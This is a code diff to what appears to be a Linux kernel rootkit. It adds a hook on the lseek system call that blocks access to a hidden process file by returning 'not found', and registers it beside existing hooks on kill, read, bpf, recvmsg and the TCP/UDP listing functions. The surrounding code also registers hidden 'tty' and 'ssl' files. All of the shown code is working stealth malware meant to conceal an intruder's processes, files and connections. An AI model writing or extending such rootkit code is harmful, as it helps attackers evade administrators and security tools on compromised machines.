@@ -36,6 +36,7 @@ sys64 real_m_kill;
 sys64 real_m_read;
 sys64 real_m_bpf;
 sys64 real_m_recvmsg;
+sys64 real_m_lseek;
 
 #define PT_REGS_PARM1(x) ((x)->di)
 #define PT_REGS_PARM2(x) ((const char *const *)(x)->si)
@@ -47,11 +48,6 @@ sys64 real_m_recvmsg;
 #define PT_REGS_RC(x) ((x)->ax)
 #define PT_REGS_SP(x) ((x)->sp)
 #define PT_REGS_IP(x) ((x)->ip)
-
-/**
- * These are kept open throughout kv lifetime
- *  This is so because tty is continuous.
- */
 
 static DEFINE_SPINLOCK(hide_once_spin);
 
@@ -618,6 +614,44 @@ err:
 leave:
 	kfree(kbuf);
 	return ret;
+}
+
+static asmlinkage long m_lseek(struct pt_regs *regs)
+{
+	int fd = (int)PT_REGS_PARM1(regs);
+	unsigned long this_ino;
+	struct dentry *dentry;
+	char *p;
+	char name[NAME_MAX + 1] = { 0 };
+
+	struct file *file = fget(fd);
+	if (!file)
+		goto resume;
+
+	this_ino = file->f_inode->i_ino;
+	dentry = file->f_path.dentry;
+	p = dentry_path_raw(dentry, name, NAME_MAX);
+
+	// Check PROCNAME partial match; otherwise don't proceed further.
+	if (NULL != p && strstr(p, PROCNAME)) {
+		struct kstat stat;
+		struct path path;
+		if (fs_kern_path(PROCNAME_FULL, &path) &&
+		    fs_file_stat(&path, &stat)) {
+			if (stat.ino == this_ino) {
+				fput(file);
+				// No lseek for PROCNAME
+				goto leave;
+			}
+		}
+	}
+
+	fput(file);
+resume:
+	return real_m_lseek(regs);
+
+leave:
+	return -ENOENT;
 }
 
 struct tcpudpdata {
@@ -1199,6 +1233,7 @@ static struct ftrace_hook ft_hooks[] = {
 	{ _sys_arch("sys_read"), m_read, &real_m_read, true },
 	{ _sys_arch("sys_bpf"), m_bpf, &real_m_bpf, true },
 	{ _sys_arch("sys_recvmsg"), m_recvmsg, &real_m_recvmsg, true },
+	{ _sys_arch("sys_lseek"), m_lseek, &real_m_lseek, true },
 	{ "tcp4_seq_show", m_tcp4_seq_show, &real_m_tcp4_seq_show },
 	{ "udp4_seq_show", m_udp4_seq_show, &real_m_udp4_seq_show },
 	{ "tcp6_seq_show", m_tcp6_seq_show, &real_m_tcp6_seq_show },
@@ -1357,7 +1392,7 @@ bool sys_init(void)
 			return rc;
 		}
 
-		/** init fist a couple of hidden files */
+		// init fist a couple of hidden files
 		fs_add_name_ro(tty, 0);
 		fs_add_name_ro(ssl, 0);
 
